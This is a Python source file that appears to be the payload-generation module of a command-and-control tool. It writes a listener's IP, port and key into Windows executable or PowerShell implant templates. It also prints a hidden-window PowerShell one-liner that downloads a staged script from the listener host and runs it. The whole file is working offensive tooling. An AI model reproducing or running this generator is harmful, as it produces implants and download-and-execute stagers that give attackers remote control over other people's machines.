from shutil import copyfile

from common import error, success, YELLOW, cRESET
import listenerHelper
Payloads = {
    "winexe": "Windows executable.",
    "powershell": "Powershell script."
}

vPayloads = [payload for payload in Payloads]
vArchs = ["x64", "x32"]


def isValidPayload(name, s):
    if name in vPayloads:
        return True
    else:
        if s == 1:
            error("Invalid payload type.")
            return False
        else:
            return False


def isValidArch(arch, s):
    if arch in vArchs:
        return True
    else:
        if s == 1:
            error("Invalid architecture.")
            return False
        else:
            return False


def viewPayloads():
    success("Available payload types: ")

    print(YELLOW)
    print(" Type                         Description")
    print("------                       -------------")

    for i in Payloads:
        print(" {}".format(i) + " " * (29 - len(i)) + "{}".format(Payloads[i]))

    print(cRESET)


def winexe(listener, arch, outputname):
    outpath = "/tmp/{}".format(outputname)
    ip = listenerHelper.listeners[listener].ip
    port = listenerHelper.listeners[listener].port

    if arch == "x64":
        copyfile("lib/templates/winexe/winexe64.exe", outpath)
    elif arch == "x32":
        copyfile("lib/templates/winexe/winexe32.exe", outpath)

    with open(outpath, "a") as f:
        f.write("{}\n{}".format(ip, port))

    success("File saved in: {}".format(outpath))


def powershell(listener, outputname):
    outpath = "/tmp/{}".format(outputname)
    ip = listenerHelper.listeners[listener].ip
    port = listenerHelper.listeners[listener].port
    key = listenerHelper.listeners[listener].key

    with open("lib/templates/powershell.ps1", "rt") as p:
        payload = p.read()

    payload = payload.replace('REPLACE_IP', ip)
    payload = payload.replace('REPLACE_PORT', str(port))
    payload = payload.replace('REPLACE_KEY', key)

    with open(outpath, "wt") as f:
        f.write(payload)

    with open("{}{}".format(listeners[listener].filePath, outputname), "wt") as f:
        f.write(payload)

    oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(
        ip, str(port), outputname)

    success("File saved in: {}".format(outpath))
    success("One liner: {}".format(oneliner))


def generatePayload(args):
    if len(args) != 4:
        error("Invalid arguments.")
        return 0
    else:

        Type = args[0]
        arch = args[1]
        listener = args[2]
        outputname = args[3]

        if not isValidPayload(Type, 1) :
            return 0

        if listenerHelper.checkListenersEmpty(1):
            return 0

        if not listenerHelper.isValidListener(listener, 1) :
            return 0

        if not isValidArch(arch, 1) :
            return 0

        if Type == "winexe":
            winexe(listener, arch, outputname)
        elif Type == "powershell":
            powershell(listener, outputname)
